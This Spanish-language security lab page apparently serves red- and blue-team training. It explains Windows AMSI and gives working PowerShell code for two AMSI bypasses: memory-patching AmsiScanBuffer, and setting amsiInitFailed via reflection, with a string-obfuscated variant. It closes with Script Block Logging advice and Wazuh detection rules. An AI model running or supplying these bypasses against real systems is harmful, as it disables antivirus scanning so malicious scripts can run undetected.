# AMSI — Internals y Bypass Techniques

**Táctica MITRE:** Defense Evasion  
**Técnica:** T1562.001 — Impair Defenses: Disable or Modify Tools  
**Severidad:** Alta  
**Contexto:** Operaciones Red Team en entornos Windows con PowerShell  

---

## 1. ¿Qué es AMSI y cómo funciona?

**AMSI (Antimalware Scan Interface)** es una API de Windows introducida en Windows 10 que permite a soluciones antivirus escanear contenido **en memoria antes de que se ejecute** — incluyendo scripts PowerShell, VBScript, JScript y más.

### Flujo de AMSI

```
Script PowerShell
       │
       ▼
┌─────────────────┐
│  amsi.dll       │  ← cargada en el proceso powershell.exe
│  AmsiScanBuffer │  ← función que escanea cada bloque
└─────────────────┘
       │
       ▼
┌─────────────────┐
│  AV/EDR         │  ← recibe el contenido para análisis
│  (Defender etc) │
└─────────────────┘
       │
       ├── AMSI_RESULT_CLEAN    → ejecutar
       └── AMSI_RESULT_DETECTED → bloquear + alertar
```

### Por qué es efectivo

- Opera **antes** de que el código toque el disco
- Escanea el contenido **después de deobfuscación** — ve el código real
- Integrado en PowerShell, .NET, WSH, VBA Office

---

## 2. Bypass Técnica 1 — Memory Patching

### Concepto

`amsi.dll` se carga en el mismo espacio de memoria del proceso PowerShell. Si modificamos la función `AmsiScanBuffer` para que siempre retorne "limpio", AMSI deja de funcionar para ese proceso.

### Cómo funciona

```
AmsiScanBuffer original:    mov r11, rsp       ← código real
                            push rbp
                            ...análisis...
                            ret AMSI_RESULT

AmsiScanBuffer parcheado:   xor eax, eax       ← retorna 0 (CLEAN)
                            ret                 ← sale inmediatamente
```

### Implementación documentada

```powershell
# AMSI Bypass via Memory Patching
# Modifica AmsiScanBuffer en memoria para retornar siempre CLEAN
# Solo funciona en el proceso actual de PowerShell

$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

# 1. Obtener dirección de AmsiScanBuffer en amsi.dll
$lib     = [Win32]::LoadLibrary("amsi.dll")
$addr    = [Win32]::GetProcAddress($lib, "AmsiScanBuffer")

# 2. Hacer la memoria escribible (PAGE_EXECUTE_READWRITE = 0x40)
$oldProt = 0
[Win32]::VirtualProtect($addr, [UIntPtr]::new(8), 0x40, [ref]$oldProt) | Out-Null

# 3. Parchear: xor eax, eax (0x31, 0xC0) + ret (0xC3)
$patch = [byte[]](0x31, 0xC0, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)

Write-Host "[+] AMSI patched — AmsiScanBuffer ahora retorna CLEAN"
```

### Limitaciones

- Solo afecta el **proceso actual** — cada nueva instancia de PS tiene AMSI activo
- Requiere que no haya un EDR con **kernel callbacks** que detecte la escritura en memoria
- ETW (Event Tracing for Windows) puede registrar la operación

---

## 3. Bypass Técnica 2 — .NET Reflection

### Concepto

Usar .NET Reflection para acceder al campo privado `amsiInitFailed` de la clase `AmsiUtils` en PowerShell. Si se setea a `true`, PowerShell deja de llamar a AMSI.

### Implementación documentada

```powershell
# AMSI Bypass via Reflection
# Setea amsiInitFailed = true en el contexto de PowerShell

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') |
    ForEach-Object {
        $_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    }

Write-Host "[+] AMSI deshabilitado via Reflection"
```

> **Nota:** Esta técnica es bien conocida y la mayoría de los AV modernos detectan la string `amsiInitFailed` en el script. Requiere obfuscación adicional.

### Versión con obfuscación básica de strings

```powershell
# Dividir strings para evadir detección por firma
$a = 'Am' + 'si' + 'Ut' + 'ils'
$b = 'am' + 'si' + 'In' + 'it' + 'Fa' + 'iled'

[Ref].Assembly.GetType("System.Management.Automation.$a") |
    ForEach-Object {
        $_.GetField($b, 'NonPublic,Static').SetValue($null, $true)
    }
```

---

## 4. Detección desde el Blue Team

### Script Block Logging (Event ID 4104)

Si Script Block Logging está habilitado, PowerShell registra el contenido **después de deobfuscación**. Esto significa que el bypass AMSI en sí mismo queda registrado:

```
# Lo que aparece en el log (aunque AMSI no lo detecte):
AmsiScanBuffer
amsiInitFailed
VirtualProtect
```

### Regla Wazuh para detección

```xml
<group name="amsi_bypass,defense_evasion,critical">

  <!-- Detección de AMSI bypass via strings conocidas en Script Block Log -->
  <rule id="100070" level="15">
    <if_group>windows_powershell</if_group>
    <id>4104</id>
    <field name="win.eventdata.scriptBlockText" type="pcre2">
      (?i)(AmsiScanBuffer|amsiInitFailed|AmsiUtils|Bypass-AMSI|amsi\.dll)
    </field>
    <description>CRÍTICO: Intento de AMSI bypass detectado en Script Block Log</description>
    <mitre>
      <id>T1562.001</id>
    </mitre>
    <group>amsi_bypass,critical</group>
  </rule>

  <!-- Detección de memory patching (VirtualProtect sobre amsi.dll) -->
  <rule id="100071" level="15">
    <if_group>windows_powershell</if_group>
    <id>4104</id>
    <field name="win.eventdata.scriptBlockText" type="pcre2">
      (?i)(VirtualProtect.*amsi|GetProcAddress.*Amsi)
    </field>
    <description>CRÍTICO: Memory patching de AMSI detectado</description>
    <mitre>
      <id>T1562.001</id>
      <id>T1055</id>
    </mitre>
    <group>amsi_patch,critical</group>
  </rule>

</group>
```

---

## 5. Por qué Script Block Logging es tan importante

```
Sin Script Block Logging:
  Atacante obfusca el bypass → AMSI no lo ve → bypass exitoso → sin rastro

Con Script Block Logging:
  Atacante obfusca el bypass → AMSI no lo ve → bypass exitoso
  PERO → PS registra el código deobfuscado en Event ID 4104
        → Wazuh detecta "amsiInitFailed" en el log
        → Alerta nivel 15 → SOC investiga
```

Esta es la razón por la que el **Case 001 del soc-lab** (PowerShell logging) es tan crítico — es la red de seguridad cuando AMSI falla.

---

## 🔗 Referencias

- [MITRE T1562.001](https://attack.mitre.org/techniques/T1562/001/)
- [Microsoft AMSI Documentation](https://docs.microsoft.com/en-us/windows/win32/amsi/)
- [rastamouse — AMSI Memory Patching](https://rastamouse.me/memory-patching-amsi-bypass/)
- [MDSec — AMSI Bypass Research](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
